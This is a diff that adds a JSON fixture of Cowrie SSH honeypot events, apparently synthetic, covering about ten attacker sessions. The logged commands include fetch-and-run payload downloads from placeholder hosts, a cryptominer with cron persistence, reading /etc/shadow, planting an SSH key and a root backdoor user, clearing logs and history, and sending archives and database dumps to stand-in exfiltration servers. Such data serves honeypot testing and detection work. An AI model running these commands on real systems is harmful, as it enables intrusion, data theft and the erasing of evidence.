@@ -1,0 +1,807 @@
+[
+  {
+    "eventid": "cowrie.session.connect",
+    "src_ip": "192.168.1.105",
+    "src_port": 49832,
+    "dst_port": 22,
+    "session": "a]1b2c3d4",
+    "protocol": "ssh",
+    "timestamp": "2026-07-20T08:15:22.000000Z",
+    "sensor": "shadowtrap-01",
+    "message": "New connection: 192.168.1.105:49832"
+  },
+  {
+    "eventid": "cowrie.login.success",
+    "src_ip": "192.168.1.105",
+    "session": "a1b2c3d4",
+    "username": "root",
+    "password": "admin123",
+    "timestamp": "2026-07-20T08:15:24.000000Z",
+    "message": "login attempt [root/admin123] succeeded"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "192.168.1.105",
+    "session": "a1b2c3d4",
+    "input": "whoami",
+    "timestamp": "2026-07-20T08:15:30.000000Z",
+    "message": "CMD: whoami"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "192.168.1.105",
+    "session": "a1b2c3d4",
+    "input": "uname -a",
+    "timestamp": "2026-07-20T08:15:35.000000Z",
+    "message": "CMD: uname -a"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "192.168.1.105",
+    "session": "a1b2c3d4",
+    "input": "cat /etc/passwd",
+    "timestamp": "2026-07-20T08:15:42.000000Z",
+    "message": "CMD: cat /etc/passwd"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "192.168.1.105",
+    "session": "a1b2c3d4",
+    "input": "cat /etc/shadow",
+    "timestamp": "2026-07-20T08:15:48.000000Z",
+    "message": "CMD: cat /etc/shadow"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "192.168.1.105",
+    "session": "a1b2c3d4",
+    "input": "wget http://malware-server.com/backdoor.sh",
+    "timestamp": "2026-07-20T08:16:05.000000Z",
+    "message": "CMD: wget http://malware-server.com/backdoor.sh"
+  },
+  {
+    "eventid": "cowrie.session.file_download",
+    "src_ip": "192.168.1.105",
+    "session": "a1b2c3d4",
+    "url": "http://malware-server.com/backdoor.sh",
+    "outfile": "/tmp/backdoor.sh",
+    "timestamp": "2026-07-20T08:16:08.000000Z",
+    "message": "Downloaded file: backdoor.sh"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "192.168.1.105",
+    "session": "a1b2c3d4",
+    "input": "chmod +x /tmp/backdoor.sh",
+    "timestamp": "2026-07-20T08:16:12.000000Z",
+    "message": "CMD: chmod +x /tmp/backdoor.sh"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "192.168.1.105",
+    "session": "a1b2c3d4",
+    "input": "sudo su",
+    "timestamp": "2026-07-20T08:16:18.000000Z",
+    "message": "CMD: sudo su"
+  },
+  {
+    "eventid": "cowrie.session.closed",
+    "src_ip": "192.168.1.105",
+    "session": "a1b2c3d4",
+    "duration": 56.0,
+    "timestamp": "2026-07-20T08:16:18.000000Z",
+    "message": "Connection lost"
+  },
+  {
+    "eventid": "cowrie.session.connect",
+    "src_ip": "10.0.0.42",
+    "src_port": 51234,
+    "dst_port": 22,
+    "session": "b2c3d4e5",
+    "protocol": "ssh",
+    "timestamp": "2026-07-20T09:22:10.000000Z",
+    "message": "New connection: 10.0.0.42:51234"
+  },
+  {
+    "eventid": "cowrie.login.success",
+    "src_ip": "10.0.0.42",
+    "session": "b2c3d4e5",
+    "username": "admin",
+    "password": "password",
+    "timestamp": "2026-07-20T09:22:13.000000Z",
+    "message": "login attempt [admin/password] succeeded"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "10.0.0.42",
+    "session": "b2c3d4e5",
+    "input": "ls -la",
+    "timestamp": "2026-07-20T09:22:20.000000Z",
+    "message": "CMD: ls -la"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "10.0.0.42",
+    "session": "b2c3d4e5",
+    "input": "pwd",
+    "timestamp": "2026-07-20T09:22:25.000000Z",
+    "message": "CMD: pwd"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "10.0.0.42",
+    "session": "b2c3d4e5",
+    "input": "find / -name '*.conf' -type f",
+    "timestamp": "2026-07-20T09:22:35.000000Z",
+    "message": "CMD: find / -name '*.conf' -type f"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "10.0.0.42",
+    "session": "b2c3d4e5",
+    "input": "cat /etc/ssh/sshd_config",
+    "timestamp": "2026-07-20T09:22:42.000000Z",
+    "message": "CMD: cat /etc/ssh/sshd_config"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "10.0.0.42",
+    "session": "b2c3d4e5",
+    "input": "netstat -tlnp",
+    "timestamp": "2026-07-20T09:22:50.000000Z",
+    "message": "CMD: netstat -tlnp"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "10.0.0.42",
+    "session": "b2c3d4e5",
+    "input": "ps aux",
+    "timestamp": "2026-07-20T09:22:55.000000Z",
+    "message": "CMD: ps aux"
+  },
+  {
+    "eventid": "cowrie.session.closed",
+    "src_ip": "10.0.0.42",
+    "session": "b2c3d4e5",
+    "duration": 45.0,
+    "timestamp": "2026-07-20T09:22:55.000000Z",
+    "message": "Connection lost"
+  },
+  {
+    "eventid": "cowrie.session.connect",
+    "src_ip": "203.0.113.77",
+    "src_port": 55678,
+    "dst_port": 22,
+    "session": "c3d4e5f6",
+    "protocol": "ssh",
+    "timestamp": "2026-07-21T14:05:00.000000Z",
+    "message": "New connection: 203.0.113.77:55678"
+  },
+  {
+    "eventid": "cowrie.login.failed",
+    "src_ip": "203.0.113.77",
+    "session": "c3d4e5f6",
+    "username": "root",
+    "password": "123456",
+    "timestamp": "2026-07-21T14:05:02.000000Z",
+    "message": "login attempt [root/123456] failed"
+  },
+  {
+    "eventid": "cowrie.login.failed",
+    "src_ip": "203.0.113.77",
+    "session": "c3d4e5f6",
+    "username": "root",
+    "password": "toor",
+    "timestamp": "2026-07-21T14:05:04.000000Z",
+    "message": "login attempt [root/toor] failed"
+  },
+  {
+    "eventid": "cowrie.login.failed",
+    "src_ip": "203.0.113.77",
+    "session": "c3d4e5f6",
+    "username": "admin",
+    "password": "admin",
+    "timestamp": "2026-07-21T14:05:06.000000Z",
+    "message": "login attempt [admin/admin] failed"
+  },
+  {
+    "eventid": "cowrie.login.success",
+    "src_ip": "203.0.113.77",
+    "session": "c3d4e5f6",
+    "username": "root",
+    "password": "root",
+    "timestamp": "2026-07-21T14:05:08.000000Z",
+    "message": "login attempt [root/root] succeeded"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "203.0.113.77",
+    "session": "c3d4e5f6",
+    "input": "id",
+    "timestamp": "2026-07-21T14:05:12.000000Z",
+    "message": "CMD: id"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "203.0.113.77",
+    "session": "c3d4e5f6",
+    "input": "curl -O http://evil.com/miner.elf",
+    "timestamp": "2026-07-21T14:05:20.000000Z",
+    "message": "CMD: curl -O http://evil.com/miner.elf"
+  },
+  {
+    "eventid": "cowrie.session.file_download",
+    "src_ip": "203.0.113.77",
+    "session": "c3d4e5f6",
+    "url": "http://evil.com/miner.elf",
+    "outfile": "/tmp/miner.elf",
+    "timestamp": "2026-07-21T14:05:22.000000Z",
+    "message": "Downloaded file: miner.elf"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "203.0.113.77",
+    "session": "c3d4e5f6",
+    "input": "chmod 777 /tmp/miner.elf",
+    "timestamp": "2026-07-21T14:05:25.000000Z",
+    "message": "CMD: chmod 777 /tmp/miner.elf"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "203.0.113.77",
+    "session": "c3d4e5f6",
+    "input": "/tmp/miner.elf --pool stratum+tcp://mining.pool:3333",
+    "timestamp": "2026-07-21T14:05:30.000000Z",
+    "message": "CMD: /tmp/miner.elf --pool stratum+tcp://mining.pool:3333"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "203.0.113.77",
+    "session": "c3d4e5f6",
+    "input": "crontab -e",
+    "timestamp": "2026-07-21T14:05:35.000000Z",
+    "message": "CMD: crontab -e"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "203.0.113.77",
+    "session": "c3d4e5f6",
+    "input": "echo '*/5 * * * * /tmp/miner.elf' >> /var/spool/cron/root",
+    "timestamp": "2026-07-21T14:05:40.000000Z",
+    "message": "CMD: echo '*/5 * * * * /tmp/miner.elf' >> /var/spool/cron/root"
+  },
+  {
+    "eventid": "cowrie.session.closed",
+    "src_ip": "203.0.113.77",
+    "session": "c3d4e5f6",
+    "duration": 40.0,
+    "timestamp": "2026-07-21T14:05:40.000000Z",
+    "message": "Connection lost"
+  },
+  {
+    "eventid": "cowrie.session.connect",
+    "src_ip": "172.16.0.99",
+    "src_port": 60001,
+    "dst_port": 22,
+    "session": "d4e5f6g7",
+    "protocol": "ssh",
+    "timestamp": "2026-07-22T02:30:00.000000Z",
+    "message": "New connection: 172.16.0.99:60001"
+  },
+  {
+    "eventid": "cowrie.login.success",
+    "src_ip": "172.16.0.99",
+    "session": "d4e5f6g7",
+    "username": "user",
+    "password": "letmein",
+    "timestamp": "2026-07-22T02:30:03.000000Z",
+    "message": "login attempt [user/letmein] succeeded"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "172.16.0.99",
+    "session": "d4e5f6g7",
+    "input": "sudo -l",
+    "timestamp": "2026-07-22T02:30:10.000000Z",
+    "message": "CMD: sudo -l"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "172.16.0.99",
+    "session": "d4e5f6g7",
+    "input": "find / -perm -4000 -type f 2>/dev/null",
+    "timestamp": "2026-07-22T02:30:18.000000Z",
+    "message": "CMD: find / -perm -4000 -type f 2>/dev/null"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "172.16.0.99",
+    "session": "d4e5f6g7",
+    "input": "cat /etc/crontab",
+    "timestamp": "2026-07-22T02:30:25.000000Z",
+    "message": "CMD: cat /etc/crontab"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "172.16.0.99",
+    "session": "d4e5f6g7",
+    "input": "ls -la /root/.ssh/",
+    "timestamp": "2026-07-22T02:30:30.000000Z",
+    "message": "CMD: ls -la /root/.ssh/"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "172.16.0.99",
+    "session": "d4e5f6g7",
+    "input": "cat /root/.ssh/authorized_keys",
+    "timestamp": "2026-07-22T02:30:35.000000Z",
+    "message": "CMD: cat /root/.ssh/authorized_keys"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "172.16.0.99",
+    "session": "d4e5f6g7",
+    "input": "echo 'ssh-rsa AAAA...attacker-key' >> /root/.ssh/authorized_keys",
+    "timestamp": "2026-07-22T02:30:42.000000Z",
+    "message": "CMD: echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "172.16.0.99",
+    "session": "d4e5f6g7",
+    "input": "history -c",
+    "timestamp": "2026-07-22T02:30:48.000000Z",
+    "message": "CMD: history -c"
+  },
+  {
+    "eventid": "cowrie.session.closed",
+    "src_ip": "172.16.0.99",
+    "session": "d4e5f6g7",
+    "duration": 48.0,
+    "timestamp": "2026-07-22T02:30:48.000000Z",
+    "message": "Connection lost"
+  },
+  {
+    "eventid": "cowrie.session.connect",
+    "src_ip": "198.51.100.23",
+    "src_port": 44321,
+    "dst_port": 22,
+    "session": "e5f6g7h8",
+    "protocol": "ssh",
+    "timestamp": "2026-07-23T11:00:00.000000Z",
+    "message": "New connection: 198.51.100.23:44321"
+  },
+  {
+    "eventid": "cowrie.login.success",
+    "src_ip": "198.51.100.23",
+    "session": "e5f6g7h8",
+    "username": "root",
+    "password": "p@ssw0rd",
+    "timestamp": "2026-07-23T11:00:03.000000Z",
+    "message": "login attempt [root/p@ssw0rd] succeeded"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "198.51.100.23",
+    "session": "e5f6g7h8",
+    "input": "ifconfig",
+    "timestamp": "2026-07-23T11:00:10.000000Z",
+    "message": "CMD: ifconfig"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "198.51.100.23",
+    "session": "e5f6g7h8",
+    "input": "ip addr show",
+    "timestamp": "2026-07-23T11:00:15.000000Z",
+    "message": "CMD: ip addr show"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "198.51.100.23",
+    "session": "e5f6g7h8",
+    "input": "nmap -sP 192.168.1.0/24",
+    "timestamp": "2026-07-23T11:00:22.000000Z",
+    "message": "CMD: nmap -sP 192.168.1.0/24"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "198.51.100.23",
+    "session": "e5f6g7h8",
+    "input": "arp -a",
+    "timestamp": "2026-07-23T11:00:30.000000Z",
+    "message": "CMD: arp -a"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "198.51.100.23",
+    "session": "e5f6g7h8",
+    "input": "cat /proc/cpuinfo",
+    "timestamp": "2026-07-23T11:00:35.000000Z",
+    "message": "CMD: cat /proc/cpuinfo"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "198.51.100.23",
+    "session": "e5f6g7h8",
+    "input": "free -m",
+    "timestamp": "2026-07-23T11:00:40.000000Z",
+    "message": "CMD: free -m"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "198.51.100.23",
+    "session": "e5f6g7h8",
+    "input": "df -h",
+    "timestamp": "2026-07-23T11:00:45.000000Z",
+    "message": "CMD: df -h"
+  },
+  {
+    "eventid": "cowrie.session.closed",
+    "src_ip": "198.51.100.23",
+    "session": "e5f6g7h8",
+    "duration": 45.0,
+    "timestamp": "2026-07-23T11:00:45.000000Z",
+    "message": "Connection lost"
+  },
+  {
+    "eventid": "cowrie.session.connect",
+    "src_ip": "185.220.101.34",
+    "src_port": 38900,
+    "dst_port": 2222,
+    "session": "f6g7h8i9",
+    "protocol": "ssh",
+    "timestamp": "2026-07-24T06:10:00.000000Z",
+    "message": "New connection: 185.220.101.34:38900"
+  },
+  {
+    "eventid": "cowrie.login.success",
+    "src_ip": "185.220.101.34",
+    "session": "f6g7h8i9",
+    "username": "root",
+    "password": "qwerty",
+    "timestamp": "2026-07-24T06:10:02.000000Z",
+    "message": "login attempt [root/qwerty] succeeded"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "185.220.101.34",
+    "session": "f6g7h8i9",
+    "input": "cd /tmp && curl -O http://botnet.cc/loader.sh && bash loader.sh",
+    "timestamp": "2026-07-24T06:10:08.000000Z",
+    "message": "CMD: cd /tmp && curl -O http://botnet.cc/loader.sh && bash loader.sh"
+  },
+  {
+    "eventid": "cowrie.session.file_download",
+    "src_ip": "185.220.101.34",
+    "session": "f6g7h8i9",
+    "url": "http://botnet.cc/loader.sh",
+    "outfile": "/tmp/loader.sh",
+    "timestamp": "2026-07-24T06:10:10.000000Z",
+    "message": "Downloaded file: loader.sh"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "185.220.101.34",
+    "session": "f6g7h8i9",
+    "input": "iptables -F",
+    "timestamp": "2026-07-24T06:10:15.000000Z",
+    "message": "CMD: iptables -F"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "185.220.101.34",
+    "session": "f6g7h8i9",
+    "input": "systemctl stop firewalld",
+    "timestamp": "2026-07-24T06:10:18.000000Z",
+    "message": "CMD: systemctl stop firewalld"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "185.220.101.34",
+    "session": "f6g7h8i9",
+    "input": "rm -rf /var/log/*",
+    "timestamp": "2026-07-24T06:10:22.000000Z",
+    "message": "CMD: rm -rf /var/log/*"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "185.220.101.34",
+    "session": "f6g7h8i9",
+    "input": "unset HISTFILE",
+    "timestamp": "2026-07-24T06:10:25.000000Z",
+    "message": "CMD: unset HISTFILE"
+  },
+  {
+    "eventid": "cowrie.session.closed",
+    "src_ip": "185.220.101.34",
+    "session": "f6g7h8i9",
+    "duration": 25.0,
+    "timestamp": "2026-07-24T06:10:25.000000Z",
+    "message": "Connection lost"
+  },
+  {
+    "eventid": "cowrie.session.connect",
+    "src_ip": "45.33.32.156",
+    "src_port": 42100,
+    "dst_port": 22,
+    "session": "g7h8i9j0",
+    "protocol": "ssh",
+    "timestamp": "2026-07-25T19:45:00.000000Z",
+    "message": "New connection: 45.33.32.156:42100"
+  },
+  {
+    "eventid": "cowrie.login.success",
+    "src_ip": "45.33.32.156",
+    "session": "g7h8i9j0",
+    "username": "pi",
+    "password": "raspberry",
+    "timestamp": "2026-07-25T19:45:03.000000Z",
+    "message": "login attempt [pi/raspberry] succeeded"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "45.33.32.156",
+    "session": "g7h8i9j0",
+    "input": "cat /proc/version",
+    "timestamp": "2026-07-25T19:45:10.000000Z",
+    "message": "CMD: cat /proc/version"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "45.33.32.156",
+    "session": "g7h8i9j0",
+    "input": "dpkg -l",
+    "timestamp": "2026-07-25T19:45:15.000000Z",
+    "message": "CMD: dpkg -l"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "45.33.32.156",
+    "session": "g7h8i9j0",
+    "input": "find / -name 'id_rsa' 2>/dev/null",
+    "timestamp": "2026-07-25T19:45:22.000000Z",
+    "message": "CMD: find / -name 'id_rsa' 2>/dev/null"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "45.33.32.156",
+    "session": "g7h8i9j0",
+    "input": "tar czf /tmp/data.tar.gz /home/ /etc/passwd /etc/shadow",
+    "timestamp": "2026-07-25T19:45:30.000000Z",
+    "message": "CMD: tar czf /tmp/data.tar.gz /home/ /etc/passwd /etc/shadow"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "45.33.32.156",
+    "session": "g7h8i9j0",
+    "input": "curl -X POST -F 'file=@/tmp/data.tar.gz' http://exfil-server.com/upload",
+    "timestamp": "2026-07-25T19:45:38.000000Z",
+    "message": "CMD: curl -X POST -F 'file=@/tmp/data.tar.gz' http://exfil-server.com/upload"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "45.33.32.156",
+    "session": "g7h8i9j0",
+    "input": "rm -f /tmp/data.tar.gz",
+    "timestamp": "2026-07-25T19:45:42.000000Z",
+    "message": "CMD: rm -f /tmp/data.tar.gz"
+  },
+  {
+    "eventid": "cowrie.session.closed",
+    "src_ip": "45.33.32.156",
+    "session": "g7h8i9j0",
+    "duration": 42.0,
+    "timestamp": "2026-07-25T19:45:42.000000Z",
+    "message": "Connection lost"
+  },
+  {
+    "eventid": "cowrie.session.connect",
+    "src_ip": "91.219.236.18",
+    "src_port": 33456,
+    "dst_port": 22,
+    "session": "h8i9j0k1",
+    "protocol": "ssh",
+    "timestamp": "2026-07-26T12:00:00.000000Z",
+    "message": "New connection: 91.219.236.18:33456"
+  },
+  {
+    "eventid": "cowrie.login.success",
+    "src_ip": "91.219.236.18",
+    "session": "h8i9j0k1",
+    "username": "root",
+    "password": "password1",
+    "timestamp": "2026-07-26T12:00:02.000000Z",
+    "message": "login attempt [root/password1] succeeded"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "91.219.236.18",
+    "session": "h8i9j0k1",
+    "input": "whoami && id",
+    "timestamp": "2026-07-26T12:00:08.000000Z",
+    "message": "CMD: whoami && id"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "91.219.236.18",
+    "session": "h8i9j0k1",
+    "input": "cat /etc/passwd | grep -v nologin",
+    "timestamp": "2026-07-26T12:00:15.000000Z",
+    "message": "CMD: cat /etc/passwd | grep -v nologin"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "91.219.236.18",
+    "session": "h8i9j0k1",
+    "input": "mysql -u root -p'' -e 'show databases'",
+    "timestamp": "2026-07-26T12:00:22.000000Z",
+    "message": "CMD: mysql -u root -p'' -e 'show databases'"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "91.219.236.18",
+    "session": "h8i9j0k1",
+    "input": "mysqldump --all-databases > /tmp/db_dump.sql",
+    "timestamp": "2026-07-26T12:00:30.000000Z",
+    "message": "CMD: mysqldump --all-databases > /tmp/db_dump.sql"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "91.219.236.18",
+    "session": "h8i9j0k1",
+    "input": "scp /tmp/db_dump.sql attacker@c2server.com:/loot/",
+    "timestamp": "2026-07-26T12:00:38.000000Z",
+    "message": "CMD: scp /tmp/db_dump.sql attacker@c2server.com:/loot/"
+  },
+  {
+    "eventid": "cowrie.session.closed",
+    "src_ip": "91.219.236.18",
+    "session": "h8i9j0k1",
+    "duration": 38.0,
+    "timestamp": "2026-07-26T12:00:38.000000Z",
+    "message": "Connection lost"
+  },
+  {
+    "eventid": "cowrie.session.connect",
+    "src_ip": "159.65.120.45",
+    "src_port": 29876,
+    "dst_port": 22,
+    "session": "i9j0k1l2",
+    "protocol": "ssh",
+    "timestamp": "2026-07-27T05:15:00.000000Z",
+    "message": "New connection: 159.65.120.45:29876"
+  },
+  {
+    "eventid": "cowrie.login.success",
+    "src_ip": "159.65.120.45",
+    "session": "i9j0k1l2",
+    "username": "test",
+    "password": "test123",
+    "timestamp": "2026-07-27T05:15:03.000000Z",
+    "message": "login attempt [test/test123] succeeded"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "159.65.120.45",
+    "session": "i9j0k1l2",
+    "input": "w",
+    "timestamp": "2026-07-27T05:15:10.000000Z",
+    "message": "CMD: w"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "159.65.120.45",
+    "session": "i9j0k1l2",
+    "input": "last",
+    "timestamp": "2026-07-27T05:15:15.000000Z",
+    "message": "CMD: last"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "159.65.120.45",
+    "session": "i9j0k1l2",
+    "input": "uptime",
+    "timestamp": "2026-07-27T05:15:18.000000Z",
+    "message": "CMD: uptime"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "159.65.120.45",
+    "session": "i9j0k1l2",
+    "input": "ls -la /var/www/html/",
+    "timestamp": "2026-07-27T05:15:25.000000Z",
+    "message": "CMD: ls -la /var/www/html/"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "159.65.120.45",
+    "session": "i9j0k1l2",
+    "input": "cat /var/www/html/wp-config.php",
+    "timestamp": "2026-07-27T05:15:30.000000Z",
+    "message": "CMD: cat /var/www/html/wp-config.php"
+  },
+  {
+    "eventid": "cowrie.session.closed",
+    "src_ip": "159.65.120.45",
+    "session": "i9j0k1l2",
+    "duration": 30.0,
+    "timestamp": "2026-07-27T05:15:30.000000Z",
+    "message": "Connection lost"
+  },
+  {
+    "eventid": "cowrie.session.connect",
+    "src_ip": "77.247.181.163",
+    "src_port": 61234,
+    "dst_port": 22,
+    "session": "j0k1l2m3",
+    "protocol": "ssh",
+    "timestamp": "2026-07-27T14:30:00.000000Z",
+    "message": "New connection: 77.247.181.163:61234"
+  },
+  {
+    "eventid": "cowrie.login.success",
+    "src_ip": "77.247.181.163",
+    "session": "j0k1l2m3",
+    "username": "root",
+    "password": "abc123",
+    "timestamp": "2026-07-27T14:30:03.000000Z",
+    "message": "login attempt [root/abc123] succeeded"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "77.247.181.163",
+    "session": "j0k1l2m3",
+    "input": "uname -r",
+    "timestamp": "2026-07-27T14:30:08.000000Z",
+    "message": "CMD: uname -r"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "77.247.181.163",
+    "session": "j0k1l2m3",
+    "input": "wget http://exploit-db.com/kernel_exploit.c -O /tmp/exploit.c",
+    "timestamp": "2026-07-27T14:30:15.000000Z",
+    "message": "CMD: wget http://exploit-db.com/kernel_exploit.c -O /tmp/exploit.c"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "77.247.181.163",
+    "session": "j0k1l2m3",
+    "input": "gcc /tmp/exploit.c -o /tmp/exploit",
+    "timestamp": "2026-07-27T14:30:20.000000Z",
+    "message": "CMD: gcc /tmp/exploit.c -o /tmp/exploit"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "77.247.181.163",
+    "session": "j0k1l2m3",
+    "input": "/tmp/exploit",
+    "timestamp": "2026-07-27T14:30:25.000000Z",
+    "message": "CMD: /tmp/exploit"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "77.247.181.163",
+    "session": "j0k1l2m3",
+    "input": "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor",
+    "timestamp": "2026-07-27T14:30:30.000000Z",
+    "message": "CMD: useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "src_ip": "77.247.181.163",
+    "session": "j0k1l2m3",
+    "input": "echo 'backdoor:x:0:0::/root:/bin/bash' >> /etc/passwd",
+    "timestamp": "2026-07-27T14:30:35.000000Z",
+    "message": "CMD: echo 'backdoor:x:0:0::/root:/bin/bash' >> /etc/passwd"
+  },
+  {
+    "eventid": "cowrie.session.closed",
+    "src_ip": "77.247.181.163",
+    "session": "j0k1l2m3",
+    "duration": 35.0,
+    "timestamp": "2026-07-27T14:30:35.000000Z",
+    "message": "Connection lost"
+  }
+]
